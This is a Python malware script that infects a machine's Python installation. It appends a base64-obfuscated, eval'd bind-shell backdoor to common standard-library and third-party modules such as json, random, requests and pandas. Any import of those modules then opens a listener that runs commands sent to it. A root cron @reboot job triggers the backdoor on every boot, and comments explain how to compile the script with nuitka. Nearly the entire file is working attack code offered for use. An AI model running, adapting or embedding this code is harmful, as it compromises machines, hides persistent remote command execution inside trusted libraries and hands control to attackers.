#!/usr/bin/env python3
from os import walk, environ, getuid
from sys import path
from glob import glob
from platform import system
from re import search
from base64 import b64encode, b64decode
from subprocess import run, PIPE

# pip install -U nuitka
# nuitka3 infect_pyfiles.py

# creating job that runs on startup on Windows
# https://devblogs.microsoft.com/scripting/use-powershell-to-create-job-that-runs-at-startup/

target_python_modules = (
    "/pandas/__init__.py",
    "/requests/__init__.py",
    "/numpy/__init__.py",
    "/tkinter/__init__.py",
    "/datetime.py",
    "/argparse.py",
    "/asyncio/__init__.py",
    "/collections/__init__.py",
    "/copy.py",
    "/csv.py",
    "/decimal.py",
    "/functools.py",
    "/http/__init__.py",
    "/importlib/__init__.py",
    "/inspect.py",
    "/json/__init__.py",
    "/pdb.py",
    "/random.py",
    "/shutil.py",
    "/types.py",
    "/unittest/__init__.py",
    "/urllib/__init__.py",
    "/uuid.py"
)
class Infector:
    def __init__(self):
        self.SYSTEM:str = system()
        self.IP:str = "0.0.0.0"
        self.PORT:int = 1025

    def infect_file(self, target_file:str):
        """Infects Python file with malicious Python code to create
        backdoor whenever the victim imports a commonly 
        utilized Python module
        """
        backdoor:bytes = b"from socket import socket, AF_INET, SOCK_STREAM"
        backdoor += b"\nfrom subprocess import run, PIPE"
        backdoor += b"\nfrom threading import Thread"
        backdoor += b"\nfrom os import _exit"
        backdoor += b"\ndef serve():"
        backdoor += b"\n\twith socket(AF_INET, SOCK_STREAM) as soc:"
        backdoor += bytes(f"\n\t\tsoc.bind((\"{self.IP}\", {self.PORT}))", "utf-8")
        backdoor += b"\n\t\tsoc.listen(5)"
        backdoor += b"\n\t\tconn, _ = soc.accept()"
        backdoor += b"\n\t\twhile True:"
        backdoor += b"\n\t\t\tcmd = conn.recv(1024).decode(\"utf-8\").strip()"
        backdoor += b"\n\t\t\tcmd_output = run(cmd.split(), stdout=PIPE, stderr=PIPE)"
        backdoor += b"\n\t\t\tif cmd_output.returncode == 0:"
        backdoor += b"\n\t\t\t\tconn.send(bytes(cmd_output.stdout))"
        backdoor += b"\n\t\t\telse: continue"
        backdoor += b"\nt = Thread(target=serve)"
        backdoor += b"\nt.start()"
        backdoor += b"\nt.join()"
        backdoor_base64:bytes = b64encode(backdoor)
        payload = (
            "\n"*2 + "from binascii import a2b_base64\n" +
            "eval(a2b_base64('{}'))\n".format(backdoor_base64.decode())
        )
        with open(target_file, "a") as f:
            f.write(payload)
        self.PORT += 1

    def start_infecting(self):
        """Begin scanning for Python files and infect each one"""
        # for testing use the samples directory in current directory 
        # comment out the line below for actual impact 
        for py_dir in self.python_dirs:
            for root, _, _ in walk(py_dir):
                divider:chr = "/" if self.SYSTEM == "Linux" else "\\"
                for file_ in glob(root+divider+"*.py"):
                    if file_ == root+divider+__file__: continue
                    for module in target_python_modules:
                        if search(r"{}$".format(module), file_):
                            self.infect_file(file_)

    def create_job(self):
        if self.SYSTEM == "Linux":
            run(
                "echo 'python3 -c \"import random\"' > $HOME/.update.sh",
                shell=True, stdout=PIPE, stderr=PIPE
            )
            run(
                "(crontab -l ; echo \"@reboot $HOME/.update.sh\")| crontab -",
                shell=True, stdout=PIPE, stderr=PIPE
            )

    def get_python_dirs(self):
        """Get default Python directory"""
        pattern:str = "\d{2}-\d{2}$" if self.SYSTEM == "Windows" else "\d\.\d$"
        self.python_dirs = []
        for p in path:
            if search(pattern, p):
                self.python_dirs.append(p)

def main():
    if getuid() != 0:
        print(f"{__file__} must be ran as root...")
        exit(0)

    infector = Infector()
    infector.get_python_dirs()
    infector.start_infecting() 
    infector.create_job()
    
if __name__ == "__main__":
    main()
